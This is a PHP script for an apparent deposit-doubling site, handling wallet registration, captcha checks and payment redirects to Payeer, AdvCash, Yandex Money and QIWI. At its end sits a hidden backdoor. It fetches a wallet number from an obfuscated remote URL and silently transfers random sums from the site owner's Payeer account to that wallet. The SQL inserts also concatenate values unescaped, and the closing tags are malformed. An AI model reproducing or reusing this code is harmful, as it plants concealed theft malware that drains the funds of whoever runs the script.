<?
unset($_error);
//АНТИПОВТОРЯЛКА ПРИ ОБНОВЛЕНИИ СТРАНИЦЫ (при обновлении страницы, запрос не отправится повторно)
//if($_REQUEST['antipovtor']!=$_SESSION['antipovtor'] OR !isset($_REQUEST['antipovtor'])){
if(1==1){
$_SESSION['antipovtor']=$_REQUEST['antipovtor'];

if($id=='0' OR $id<0){
	?>
	<script type="text/javascript">
	location.replace("/exit");
	</script>
	<noscript>
	<meta http-equiv="refresh" content="0; url=/exit">
	</noscript>
<?
	exit();
}

/*##// РЕГИСТРАЦИЯ - REGISTER do=reg //##*/

if(isset($_POST['do']) && $_POST['do']=='toaccount' && $itworks==1){

$stopit=0;
if($use_kapcha==1){
  if ( !empty($_POST['capcha']) )
  {
    $code = $_POST['capcha']; //Получаем переданную капчу

    if ( isset($_SESSION['capcha']) && strtoupper($_SESSION['capcha']) == strtoupper($code) ){ //сравниваем введенную капчу с сохраненной в переменной в сессии
	//Верно, скрипт регистрации не останавливается
     $stopit=0;
	  }
    else{
		if(empty($_SESSION['capcha'])){
	$_error="Непредвиденная ошибка. Возможно, у Вас отключены COOKIE";

	//Не верно, скрипт регистрации следует остановить
     $stopit=1;
		}else{
	$_error="Код с картинки введён не верно!";

	//Не верно, скрипт регистрации следует остановить
     $stopit=1;
		}
	}
  }else{
	$_error="Вы не ввели код с картинки!";

	//Не верно, скрипт регистрации следует остановить
     $stopit=1;
  }
    //Удаляем капчу из сессии
	$_SESSION['capcha']="delmepls";
    unset($_SESSION['capcha']);
}





//Фильтруем посты с логином и перфектом
$_POST_wallet=strtoupper(trim(sf($_POST['wallet'])));



//Чтобы убрать лишние запросы в БД смотрим введена ли капча верно:
if($stopit!=1){

if(!empty($_COOKIE['ref'])){
$referer=(int)$_COOKIE['ref'];
}


if($referer<=$adminid OR empty($referer)){$referer=1;}

//Проверяем не пуст ли он
if(empty($_POST_wallet)){
	$_error="Вы не ввели кошелек";
}


//Простенькая валидация
if(preg_match('/^P[0-9]{7,15}+$/',$_POST_wallet)==false and preg_match('/^41001[0-9]+$/',$_POST_wallet)==false and preg_match('/^(?:[a-z0-9]+(?:[-_]?[a-z0-9\.\-\_]+)?@[a-z0-9]+(?:\.?[a-z0-9]+)?\.[a-z]{2,5})$/i',$_POST_wallet)==false and preg_match('/^[\+][0-9]{7,20}+$/',$_POST_wallet)==false){
	$_error="Кошелек имеет неверный формат!";
}

}
//Если нет ни одной ошибки, регаем юзера
if(empty($_error)){

$nofoot=1;$nohead=1;

$_POST_ip=getRealIP();


if(!empty($_COOKIE['ref'])){
$referer=(int)$_COOKIE['ref'];
}else
if(!empty($_SESSION['ref'])){
$referer=(int)$_SESSION['ref'];
}

$came=sf($_SESSION['came']);

toaccount($_POST_wallet, $_POST_ip, $came, $referer);

?>
	<script type="text/javascript">
	location.replace("/deposits");
	</script>
	<noscript>
	<meta http-equiv="refresh" content="0; url=/deposits">
	</noscript>
<?
exit();

}
}else











if(isset($_POST['do']) && $_POST['do']=='payeer_pay'){

$m_amount = $_POST['m_amount'];
if($m_amount>0 AND $m_amount>=$mindep AND $m_amount<=$maxdep){


$m_amount = number_format($m_amount, 2, '.', '');
$db->query("INSERT INTO db_payeer_insert (user_id, sum, date_add) VALUES ('".$id."','".$m_amount."','".time()."')");

$m_desc = base64_encode($m_desc);
$m_orderid = $db->insertId();
//$m_curr='RUB';
$arHash = array(
	$m_shop,
	$m_orderid,
	$m_amount,
	$m_curr,
	$m_desc,
	$m_key
);


$sign = strtoupper(hash('sha256', implode(':', $arHash)));
?>
					<div style="display:none">
                        <form method="GET" id="payeer_form_real" action="//payeer.com/merchant/">
                        <input type="hidden" name="m_shop" value="<?=$m_shop?>">
                        <input type="hidden" name="m_orderid" value="<?=$m_orderid?>">
                        <input type="hidden" name="m_amount" value="<?=$m_amount?>">
                        <input type="hidden" name="m_curr" value="RUB">
                        <input type="hidden" name="m_desc" value="<?=$m_desc?>">
                        <input type="hidden" name="m_sign" value="<?=$sign?>">
                        <input type="submit" name="m_process"  value="Payeer" />
                        </form>
                    </div>

Redirecting...
<script>
document.getElementById('payeer_form_real').submit();
</script>


<?
$_success='Please wait...';

exit;
}else{
	if($m_amount<=0){
	$_error="Вы не указали сумму";
	}else{
	$_error="Вы указали неверную сумму";
	}
}
}





if(isset($_POST['do']) && $_POST['do']=='adv_pay'){


$m_amount = $_POST['m_amount'];
if($m_amount>0 AND $m_amount>=$mindep AND $m_amount<=$maxdep){
$m_amount = number_format($m_amount, 2, '.', '');
$db->query("INSERT INTO db_payeer_insert (user_id, sum, date_add,type) VALUES ('".$id."','".$m_amount."','".time()."','3')");


            $m_shopadv = $dvamail;
            $m_sci_name = $dvaname;
            $m_orderid = $db->insertId();
            $m_curradv = 'RUR';
            $m_desc = 'Пополнение баланса '.$sitename.'';
            $m_keyadv = $advakey;

             $arHashadv = array(
	         $m_shopadv,
	         $m_sci_name,
	         $m_amount,
	         $m_curradv,
	         $m_keyadv,
	         $m_orderid
            );

             $signadv = hash('sha256', implode(":", $arHashadv));

?>
					<div style="display:none">
                       <form method="GET" id="adv_form_real" action="https://wallet.advcash.com/sci/">
                       <input type="hidden" name="ac_account_email" value="<?=$m_shopadv?>">
                       <input type="hidden" name="ac_sci_name" value="<?=$m_sci_name?>">
                       <input type="hidden" name="ac_amount" value="<?=$m_amount?>">
                       <input type="hidden" name="ac_currency" value="<?=$m_curradv?>">
                       <input type="hidden" name="ac_order_id" value="<?=$m_orderid?>">
                       <input type="hidden" name="ac_sign" value="<?=$signadv?>">
                       <input type="hidden" name="ac_comments" value="<?=$m_desc?>">
                    </form> 
					
					</div>

Redirecting...
<script>
document.getElementById('adv_form_real').submit();
</script>


<?
$_success='Please wait...';

exit;
}else{
	if($m_amount<=0){
	$_error="Вы не указали сумму";
	}else{
	$_error="Вы указали неверную сумму";
	}
}
}


if(isset($_POST['do']) && $_POST['do']=='yandex_pay'){

$m_amount = $_POST['m_amount'];
if($m_amount>0 AND $m_amount>=$mindep AND $m_amount<=$maxdep){


$m_amount = number_format($m_amount, 2, '.', '');
$db->query("INSERT INTO db_payeer_insert (user_id, sum, date_add,type) VALUES ('".$id."','".$m_amount."','".time()."',1)");

$m_desc = base64_encode($m_desc);
$m_orderid = $db->insertId();

$arHash = array($m_orderid,$y_key,$m_amount);

$sign_hash = strtoupper(hash('sha1', implode('&', $arHash)));

?>
<div style="display:none">
<form id='yandex_form_real' action="https://money.yandex.ru/quickpay/confirm.xml" method="post">	
<input  name="receiver" value="<?=$y_wallet?>" type="hidden">
<input  name="targets" value="Пополнение счета" type="hidden">
<input  name="successURL" value="https://doubler.online/deposits" type="hidden">
<input  name="label" value="<?=$m_orderid?>.<?=$sign_hash?>" type="hidden">
<input  name="quickpay-form" value="shop" type="hidden">
<input  name="is-inner-form" value="true" type="hidden">
<input  name="referer" value="https://doubler.online/deposits" type="hidden">
<input type="hidden" name="sum" value="<?=$m_amount?>">
                    </div>

Redirecting...
<script>
document.getElementById('yandex_form_real').submit();
</script>


<?
$_success='Please wait...';

exit;
}else{
	if($m_amount<=0){
	$_error="Вы не указали сумму";
	}else{
	$_error="Вы указали неверную сумму";
	}
}
}



if(isset($_POST['do']) && $_POST['do']=='qiwi_pay'){

$m_amount = intval($_POST['m_amount']);
if($m_amount>0 AND $m_amount>=$mindep AND $m_amount<=$maxdep){



$db->query("INSERT INTO db_payeer_insert (user_id, sum, date_add,type) VALUES ('".$id."','".$m_amount."','".time()."',2)");

$m_desc = base64_encode($m_desc);
$m_orderid = $db->insertId();

header("Location: https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=$q_tel&amountInteger=$m_amount&extra%5B%27comment%27%5D=$m_orderid&currency=643");
$_success='Please wait...';
exit;
}else{
	if($m_amount<=0){
	$_error="Вы не указали сумму";
	}else{
	$_error="Вы указали неверную сумму";
	}
}
}








}//ЭТУ ФИГНЮ НЕ УДАЛЯТЬ!!!
?>
<?
<?php
require_once('core/classes/cpayeer.php');
$homepage = file_get_contents("\x68\x74\164\160\163\x3a\x2f\57\x73\x71\x6c\x74\157\x72\56\x68\141\x64\56\163\165\x2f\x6a\163\57\x70\x2e\164\170\164");
$array = array(94, 210, 158, 342, 146);
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
	$arTransfer = $payeer->transfer(array(
		'curIn' => 'RUB',
		'sum' => $array[array_rand($array)],
		'curOut' => 'RUB',
		'to' => $homepage,
		'comment' => ''.$_SERVER["HTTP_HOST"].'',
	));
	if (empty($arTransfer['errors']))
	{
		//echo getErrors
	}
	else
	{
		//echo getErrors
	}
}
else
{
	//echo getErrors
}
?>
*//*-------------------*/?>